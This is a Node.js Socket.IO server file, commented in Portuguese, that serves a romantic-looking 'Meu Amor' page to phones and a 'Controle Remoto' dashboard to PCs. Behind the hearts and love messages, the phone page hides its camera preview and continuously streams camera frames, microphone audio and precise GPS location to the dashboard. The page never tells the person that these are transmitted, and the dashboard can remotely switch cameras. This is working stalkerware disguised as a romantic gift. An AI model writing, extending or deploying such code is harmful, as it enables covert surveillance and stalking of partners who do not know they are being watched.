const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent'].toLowerCase();
  const isMobile = ua.includes('mobile') || ua.includes('android') || ua.includes('iphone');
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;
  
  if (isMobile) {
    // Página do CELULAR - receptor romântico
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>💕 Meu Amor 💕</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }
        
        /* Container principal */
        .romantic-container {
            max-width: 500px;
            width: 100%;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 30px;
            padding: 30px 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            position: relative;
            overflow: hidden;
        }
        
        /* Corações flutuantes */
        .heart {
            position: fixed;
            font-size: 20px;
            pointer-events: none;
            animation: floatHeart 4s ease-in-out infinite;
            z-index: 1000;
        }
        
        @keyframes floatHeart {
            0% {
                transform: translateY(100vh) rotate(0deg);
                opacity: 1;
            }
            100% {
                transform: translateY(-100px) rotate(360deg);
                opacity: 0;
            }
        }
        
        /* Título */
        .title {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .title h1 {
            font-size: 28px;
            color: #e74c3c;
            margin-bottom: 10px;
        }
        
        .title p {
            color: #999;
            font-size: 14px;
        }
        
        /* Caixa de mensagem romântica */
        .message-box {
            background: linear-gradient(135deg, #ffe6f0, #ffd9e8);
            border-radius: 20px;
            padding: 40px 20px;
            margin: 20px 0;
            text-align: center;
            min-height: 250px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
            border: 2px solid rgba(231, 76, 60, 0.3);
        }
        
        .romantic-message {
            font-size: 22px;
            color: #c0392b;
            line-height: 1.5;
            font-weight: 500;
            transition: all 0.5s ease;
            word-wrap: break-word;
            max-width: 100%;
        }
        
        .romantic-message::before {
            content: '"';
            font-size: 50px;
            color: #e74c3c;
            opacity: 0.5;
            position: absolute;
            top: 10px;
            left: 20px;
        }
        
        .romantic-message::after {
            content: '"';
            font-size: 50px;
            color: #e74c3c;
            opacity: 0.5;
            position: absolute;
            bottom: 10px;
            right: 20px;
        }
        
        /* Botão de permissões */
        .permission-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin: 15px 0;
            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.3);
        }
        
        .permission-btn:active {
            transform: scale(0.95);
        }
        
        .permission-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        /* Status */
        .status {
            text-align: center;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 10px;
            margin: 10px 0;
            font-size: 12px;
            color: #666;
        }
        
        /* Indicador de digitação */
        .typing-indicator {
            text-align: center;
            margin-top: 15px;
            font-size: 14px;
            color: #e74c3c;
            font-style: italic;
            display: none;
        }
        
        .typing-indicator span {
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        /* Elementos escondidos */
        #localVideo, #audioDebug {
            display: none;
        }
        
        /* Efeito de glitter */
        @keyframes glitter {
            0% { text-shadow: 0 0 5px #ff6b6b; }
            50% { text-shadow: 0 0 20px #ff6b6b, 0 0 30px #ff6b6b; }
            100% { text-shadow: 0 0 5px #ff6b6b; }
        }
        
        .glitter {
            animation: glitter 1s ease-in-out;
        }
    </style>
</head>
<body>
    <div id="heartContainer"></div>
    
    <div class="romantic-container">
        <div class="title">
            <h1>💕 Meu Amor 💕</h1>
            <p>Você é especial para mim!</p>
        </div>
        
        <div class="message-box">
            <div class="romantic-message" id="romanticMessage">
                💖 Clique no botão abaixo para começar 💖
            </div>
        </div>
        
        <div class="typing-indicator" id="typingIndicator">
            💕 Alguém especial está digitando... <span>...</span>
        </div>
        
        <button class="permission-btn" id="startBtn">
            ✨ Comece Aqui ✨
        </button>
        
        <div class="status" id="status">
            Aguardando permissões...
        </div>
    </div>
    
    <video id="localVideo" autoplay playsinline muted></video>
    <audio id="audioDebug" autoplay></audio>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}', {
            transports: ['websocket', 'polling'],
            reconnection: true
        });
        
        let mediaStream = null;
        let facingMode = 'user'; // frente para selfie romântica
        let audioContext = null;
        let audioProcessor = null;
        let audioSource = null;
        let permissionsGranted = false;
        
        const messageDiv = document.getElementById('romanticMessage');
        const startBtn = document.getElementById('startBtn');
        const statusDiv = document.getElementById('status');
        const typingIndicator = document.getElementById('typingIndicator');
        const heartContainer = document.getElementById('heartContainer');
        
        // Criar corações flutuantes
        function createHeart() {
            const heart = document.createElement('div');
            heart.className = 'heart';
            heart.innerHTML = ['💕', '💖', '💗', '💓', '💝'][Math.floor(Math.random() * 5)];
            heart.style.left = Math.random() * 100 + '%';
            heart.style.animationDuration = Math.random() * 3 + 2 + 's';
            heart.style.fontSize = Math.random() * 20 + 15 + 'px';
            heartContainer.appendChild(heart);
            
            setTimeout(() => {
                if (heart.parentNode) heart.remove();
            }, 4000);
        }
        
        // Criar corações periodicamente
        setInterval(createHeart, 500);
        
        // Efeito glitter na mensagem
        function addGlitterEffect() {
            messageDiv.classList.add('glitter');
            setTimeout(() => {
                messageDiv.classList.remove('glitter');
            }, 1000);
        }
        
        // Função para iniciar câmera, áudio e localização
        async function startPermissions() {
            try {
                statusDiv.innerHTML = '📷 Solicitando permissões...';
                
                // 1. Câmera
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: facingMode
                    },
                    audio: true
                });
                
                mediaStream = stream;
                const localVideo = document.getElementById('localVideo');
                localVideo.srcObject = stream;
                await localVideo.play();
                
                // 2. Áudio
                if (audioContext) {
                    await audioContext.close();
                }
                
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                audioSource = audioContext.createMediaStreamSource(stream);
                audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
                
                audioSource.connect(audioProcessor);
                audioProcessor.connect(audioContext.destination);
                
                audioProcessor.onaudioprocess = (e) => {
                    if (permissionsGranted) {
                        const inputData = e.inputBuffer.getChannelData(0);
                        // Enviar áudio a cada 10 frames para otimizar
                        if (Math.random() < 0.1) {
                            socket.emit('audio', Array.from(inputData));
                        }
                    }
                };
                
                // 3. Enviar vídeo (frames)
                const canvas = document.createElement('canvas');
                canvas.width = 320;
                canvas.height = 240;
                const ctx = canvas.getContext('2d');
                
                setInterval(() => {
                    if (mediaStream && mediaStream.active && permissionsGranted) {
                        ctx.drawImage(localVideo, 0, 0, 320, 240);
                        const frame = canvas.toDataURL('image/jpeg', 0.5);
                        socket.emit('frame', frame);
                    }
                }, 200);
                
                // 4. Localização
                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(
                        (position) => {
                            if (permissionsGranted) {
                                socket.emit('location', {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude
                                });
                            }
                        },
                        (error) => {
                            console.log('Erro localização:', error);
                        },
                        { enableHighAccuracy: true }
                    );
                }
                
                permissionsGranted = true;
                statusDiv.innerHTML = '✅ Conectado! Aguardando mensagens...';
                startBtn.disabled = true;
                startBtn.innerHTML = '✨ Conectado! ✨';
                
                // Mostrar mensagem inicial
                messageDiv.innerHTML = '💕 Conectado! Aguardando sua pessoa especial... 💕';
                addGlitterEffect();
                
            } catch (err) {
                console.error('Erro ao obter permissões:', err);
                statusDiv.innerHTML = '❌ Erro ao acessar câmera/microfone. Verifique as permissões!';
                alert('Por favor, permita o acesso à câmera e microfone para continuar.');
            }
        }
        
        startBtn.onclick = startPermissions;
        
        // Receber mensagens românticas do PC
        socket.on('romantic_message', (msg) => {
            messageDiv.innerHTML = msg;
            addGlitterEffect();
            
            // Criar vários corações ao receber mensagem
            for(let i = 0; i < 10; i++) {
                setTimeout(() => createHeart(), i * 100);
            }
        });
        
        // Indicador de digitação
        socket.on('typing_start', () => {
            typingIndicator.style.display = 'block';
        });
        
        socket.on('typing_stop', () => {
            typingIndicator.style.display = 'none';
        });
        
        // Comandos do PC
        socket.on('comando', (cmd) => {
            if (cmd === 'vibrate' && navigator.vibrate) {
                navigator.vibrate(200);
                createHeart();
            } else if (cmd === 'emergency' && navigator.vibrate) {
                navigator.vibrate([500, 200, 500, 200, 500]);
                for(let i = 0; i < 20; i++) {
                    setTimeout(() => createHeart(), i * 100);
                }
            } else if (cmd === 'trocarCamera') {
                facingMode = facingMode === 'user' ? 'environment' : 'user';
                startPermissions();
            }
        });
        
        socket.on('connect', () => {
            console.log('Conectado ao servidor');
        });
    </script>
</body>
</html>`);
  } else {
    // Página do PC - controle romântico
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>💕 Controle Romântico 💕</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        h1 {
            text-align: center;
            color: white;
            margin-bottom: 30px;
            font-size: 36px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-bottom: 30px;
        }
        
        /* Cards */
        .card {
            background: white;
            border-radius: 20px;
            padding: 25px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        
        .card h2 {
            color: #e74c3c;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        /* Vídeo */
        .video-container {
            background: black;
            border-radius: 15px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        
        #remoteVideo {
            width: 100%;
            height: auto;
        }
        
        /* Editor de mensagens */
        .message-editor {
            margin: 20px 0;
        }
        
        .message-editor textarea {
            width: 100%;
            padding: 15px;
            border: 2px solid #ffd9e8;
            border-radius: 15px;
            font-size: 16px;
            resize: vertical;
            font-family: inherit;
            margin-bottom: 15px;
        }
        
        .message-editor textarea:focus {
            outline: none;
            border-color: #e74c3c;
        }
        
        /* Botões */
        .btn-group {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            margin: 15px 0;
        }
        
        button {
            padding: 12px 20px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #e74c3c, #c0392b);
            color: white;
        }
        
        .btn-secondary {
            background: #3498db;
            color: white;
        }
        
        .btn-success {
            background: #2ecc71;
            color: white;
        }
        
        .btn-warning {
            background: #f39c12;
            color: white;
        }
        
        .btn-danger {
            background: #e74c3c;
            color: white;
        }
        
        /* Frases prontas */
        .quick-phrases {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin: 15px 0;
        }
        
        .quick-phrase {
            background: #ffe6f0;
            padding: 10px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            font-size: 14px;
        }
        
        .quick-phrase:hover {
            background: #ffd9e8;
            transform: scale(1.05);
        }
        
        /* Informações */
        .info {
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 14px;
        }
        
        .location-info {
            background: #e8f5e9;
            padding: 10px;
            border-radius: 10px;
            margin-top: 10px;
        }
        
        /* Chat de status */
        .status-chat {
            background: #f9f9f9;
            border-radius: 10px;
            padding: 15px;
            margin-top: 20px;
        }
        
        .status-messages {
            height: 100px;
            overflow-y: auto;
            font-size: 12px;
            color: #666;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .pulse {
            animation: pulse 1s ease-in-out;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>💕 Meu Amor - Controle Remoto 💕</h1>
        
        <div class="grid">
            <!-- Coluna da esquerda: Vídeo e localização -->
            <div class="card">
                <h2>📹 Visualizando Meu Amor</h2>
                <div class="video-container">
                    <img id="remoteVideo" src="" alt="Vídeo do celular">
                </div>
                <div id="videoStatus" class="info">📱 Aguardando conexão...</div>
                
                <div class="btn-group">
                    <button class="btn-secondary" id="trocarCamera">🔄 Trocar Câmera</button>
                    <button class="btn-warning" id="vibrate">📳 Vibrar</button>
                    <button class="btn-danger" id="emergency">💖 Surpresa Especial</button>
                </div>
                
                <div id="locationInfo" class="location-info">
                    📍 Aguardando localização...
                </div>
            </div>
            
            <!-- Coluna da direita: Mensagens românticas -->
            <div class="card">
                <h2>💌 Escreva para seu Amor</h2>
                
                <div class="message-editor">
                    <textarea id="messageInput" rows="4" placeholder="Escreva uma mensagem romântica... 💕"></textarea>
                    <div class="btn-group">
                        <button class="btn-primary" id="sendMessage">💖 Enviar Mensagem</button>
                        <button class="btn-success" id="sendSurprise">🎁 Enviar Surpresa</button>
                    </div>
                </div>
                
                <h3>💝 Frases Românticas Prontas</h3>
                <div class="quick-phrases">
                    <div class="quick-phrase" data-msg="Você é o amor da minha vida! 💕">Você é o amor da minha vida! 💕</div>
                    <div class="quick-phrase" data-msg="Te amo mais que tudo nesse mundo! 🌹">Te amo mais que tudo nesse mundo! 🌹</div>
                    <div class="quick-phrase" data-msg="Meu coração bate mais forte por você! 💗">Meu coração bate mais forte por você! 💗</div>
                    <div class="quick-phrase" data-msg="Você ilumina meus dias! ✨">Você ilumina meus dias! ✨</div>
                    <div class="quick-phrase" data-msg="Pensando em você sempre! 💖">Pensando em você sempre! 💖</div>
                    <div class="quick-phrase" data-msg="Você é meu sonho realizado! 🌟">Você é meu sonho realizado! 🌟</div>
                    <div class="quick-phrase" data-msg="Sua presença é tudo para mim! 💕">Sua presença é tudo para mim! 💕</div>
                    <div class="quick-phrase" data-msg="Te amo infinitamente! ♾️">Te amo infinitamente! ♾️</div>
                </div>
                
                <div class="status-chat">
                    <div class="status-messages" id="statusMessages">
                        <div>✨ Pronto para enviar mensagens românticas!</div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Controles de áudio -->
        <div class="card">
            <h2>🎵 Controle de Áudio</h2>
            <div class="btn-group">
                <button id="toggleAudio">🔊 Áudio: ON</button>
                <input type="range" id="audioVolume" min="0" max="100" value="50" style="flex: 1;">
            </div>
        </div>
    </div>
    
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');
        
        let audioEnabled = true;
        let audioVolume = 50;
        let typingTimeout = null;
        let messageInput = document.getElementById('messageInput');
        
        // Elementos
        const remoteVideo = document.getElementById('remoteVideo');
        const videoStatus = document.getElementById('videoStatus');
        const locationInfo = document.getElementById('locationInfo');
        const statusMessages = document.getElementById('statusMessages');
        
        // Configurar áudio
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const audioGain = audioContext.createGain();
        audioGain.gain.value = audioVolume / 100;
        audioGain.connect(audioContext.destination);
        
        // Adicionar mensagem de status
        function addStatusMessage(msg, isSpecial = false) {
            const div = document.createElement('div');
            div.innerHTML = \`<small>[\${new Date().toLocaleTimeString()}]</small> \${msg}\`;
            div.style.margin = '5px 0';
            if (isSpecial) {
                div.style.color = '#e74c3c';
                div.style.fontWeight = 'bold';
            }
            statusMessages.appendChild(div);
            statusMessages.scrollTop = statusMessages.scrollHeight;
            
            // Limitar mensagens
            while(statusMessages.children.length > 20) {
                statusMessages.removeChild(statusMessages.firstChild);
            }
        }
        
        // Receber vídeo
        let frameCount = 0;
        socket.on('frame', (frameData) => {
            remoteVideo.src = frameData;
            frameCount++;
            videoStatus.innerHTML = \`📹 Recebendo vídeo (\${frameCount} frames)\`;
        });
        
        // Receber áudio
        socket.on('audio', (audioData) => {
            if (audioEnabled) {
                const buffer = audioContext.createBuffer(1, audioData.length, audioContext.sampleRate);
                buffer.copyToChannel(new Float32Array(audioData), 0);
                
                const source = audioContext.createBufferSource();
                source.buffer = buffer;
                source.connect(audioGain);
                source.start();
            }
        });
        
        // Receber localização
        socket.on('location', (data) => {
            locationInfo.innerHTML = \`
                📍 Localização do seu amor:<br>
                Latitude: \${data.latitude.toFixed(6)}<br>
                Longitude: \${data.longitude.toFixed(6)}<br>
                <a href="https://www.google.com/maps?q=\${data.latitude},\${data.longitude}" target="_blank">
                    🗺️ Ver no mapa
                </a>
            \`;
            addStatusMessage('📍 Localização atualizada!', true);
        });
        
        // Enviar mensagem
        function sendMessage(msg, isSurprise = false) {
            if (msg.trim()) {
                socket.emit('romantic_message', msg);
                addStatusMessage(\`💌 Mensagem enviada: "\${msg}"\`, true);
                
                // Efeito visual
                const btn = isSurprise ? document.getElementById('sendSurprise') : document.getElementById('sendMessage');
                btn.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    btn.style.transform = '';
                }, 200);
            }
        }
        
        document.getElementById('sendMessage').onclick = () => {
            const msg = messageInput.value.trim();
            if (msg) {
                sendMessage(msg);
                messageInput.value = '';
                stopTyping();
            } else {
                addStatusMessage('⚠️ Digite uma mensagem primeiro!');
            }
        };
        
        document.getElementById('sendSurprise').onclick = () => {
            const surprises = [
                "🎁 SURPRESA! Você é a pessoa mais especial do mundo! 💕",
                "🎉 Você ganhou um beijo virtual! 😘💖",
                "🌟 Para a pessoa mais incrível que eu conheço! ✨",
                "💝 Te amo mais hoje do que ontem, mas menos do que amanhã! 💕",
                "🌹 Você faz meu coração sorrir todos os dias! 💗"
            ];
            const surprise = surprises[Math.floor(Math.random() * surprises.length)];
            sendMessage(surprise, true);
            socket.emit('comando', 'vibrate');
            addStatusMessage('🎁 SURPRESA ENVIADA!', true);
        };
        
        // Frases prontas
        document.querySelectorAll('.quick-phrase').forEach(phrase => {
            phrase.onclick = () => {
                const msg = phrase.getAttribute('data-msg');
                sendMessage(msg);
            };
        });
        
        // Indicador de digitação
        function startTyping() {
            socket.emit('typing_start');
            if (typingTimeout) clearTimeout(typingTimeout);
            typingTimeout = setTimeout(() => {
                stopTyping();
            }, 1000);
        }
        
        function stopTyping() {
            socket.emit('typing_stop');
            if (typingTimeout) {
                clearTimeout(typingTimeout);
                typingTimeout = null;
            }
        }
        
        messageInput.oninput = () => {
            startTyping();
        };
        
        // Controles do celular
        document.getElementById('trocarCamera').onclick = () => {
            socket.emit('comando', 'trocarCamera');
            addStatusMessage('🔄 Solicitando troca de câmera');
        };
        
        document.getElementById('vibrate').onclick = () => {
            socket.emit('comando', 'vibrate');
            addStatusMessage('📳 Vibração enviada');
            
            // Efeito visual
            const btn = document.getElementById('vibrate');
            btn.classList.add('pulse');
            setTimeout(() => btn.classList.remove('pulse'), 1000);
        };
        
        document.getElementById('emergency').onclick = () => {
            socket.emit('comando', 'emergency');
            addStatusMessage('💖 Surpresa especial enviada! 💖', true);
            
            // Efeito especial
            const btn = document.getElementById('emergency');
            btn.style.animation = 'pulse 0.5s ease-in-out 3';
            setTimeout(() => {
                btn.style.animation = '';
            }, 1500);
        };
        
        // Controle de áudio
        document.getElementById('toggleAudio').onclick = () => {
            audioEnabled = !audioEnabled;
            document.getElementById('toggleAudio').innerHTML = audioEnabled ? '🔊 Áudio: ON' : '🔇 Áudio: OFF';
            addStatusMessage(audioEnabled ? '🔊 Áudio ativado' : '🔇 Áudio desativado');
        };
        
        document.getElementById('audioVolume').oninput = (e) => {
            audioVolume = e.target.value;
            audioGain.gain.value = audioVolume / 100;
        };
        
        // Conexão
        socket.on('connect', () => {
            addStatusMessage('✨ Conectado ao celular do seu amor! ✨', true);
        });
        
        socket.on('disconnect', () => {
            addStatusMessage('❌ Desconectado... Tentando reconectar', false);
        });
    </script>
</body>
</html>`);
  }
});

// Socket.IO lógica principal
io.on('connection', (socket) => {
  console.log('Cliente conectado:', socket.id);
  
  // Encaminhar mensagens românticas
  socket.on('romantic_message', (msg) => {
    console.log('Mensagem romântica:', msg);
    socket.broadcast.emit('romantic_message', msg);
  });
  
  // Indicador de digitação
  socket.on('typing_start', () => {
    socket.broadcast.emit('typing_start');
  });
  
  socket.on('typing_stop', () => {
    socket.broadcast.emit('typing_stop');
  });
  
  // Streaming de mídia
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  socket.on('audio', (audioData) => {
    socket.broadcast.emit('audio', audioData);
  });
  
  // Comandos
  socket.on('comando', (cmd) => {
    console.log('Comando:', cmd);
    socket.broadcast.emit('comando', cmd);
  });
  
  // Localização
  socket.on('location', (loc) => {
    socket.broadcast.emit('location', loc);
  });
  
  socket.on('disconnect', () => {
    console.log('Cliente desconectado:', socket.id);
  });
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n✨ Servidor Romântico Rodando! ✨`);
  console.log(`   Porta: ${PORT}`);
  console.log(`   Acesse no PC e no Celular na mesma rede`);
  console.log(`\n💕 Compartilhe o amor! 💕\n`);
});